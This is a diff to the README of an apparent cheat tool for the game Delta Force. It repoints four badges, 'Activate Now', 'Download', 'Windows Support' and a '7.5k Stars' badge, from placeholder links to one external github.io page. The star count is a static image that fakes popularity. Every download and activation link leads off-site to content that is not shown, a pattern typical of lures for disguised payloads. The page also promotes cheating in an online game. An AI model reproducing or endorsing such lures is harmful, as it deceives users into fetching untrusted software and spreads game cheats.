@@ -11,10 +11,10 @@ Delta Force emphasizes teamwork and accuracy, but unpredictable firefights can t
 \[!WARNING]
 For **offline and private training** only. It does not alter core game files.
 
-[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](#)
-[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](#)
-[![⭐️ 7.5k Stars](https://img.shields.io/badge/⭐️%207.5k-Stars-yellow?style=for-the-badge\&logo=github)](#)
-[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](#)
+[![Activate Now](https://img.shields.io/badge/Activate%20Now-red?style=for-the-badge\&logo=rocket)](https://delta-force-cheat-tool.github.io/.github/)
+[![Windows Support](https://img.shields.io/badge/Windows-10%2F11-blue?style=for-the-badge\&logo=windows)](https://delta-force-cheat-tool.github.io/.github/)
+[![⭐️ 7.5k Stars](https://img.shields.io/badge/⭐️%207.5k-Stars-yellow?style=for-the-badge\&logo=github)](https://delta-force-cheat-tool.github.io/.github/)
+[![Download](https://img.shields.io/badge/Download-Latest-green?style=for-the-badge\&logo=github)](https://delta-force-cheat-tool.github.io/.github/)
 
 ---
 
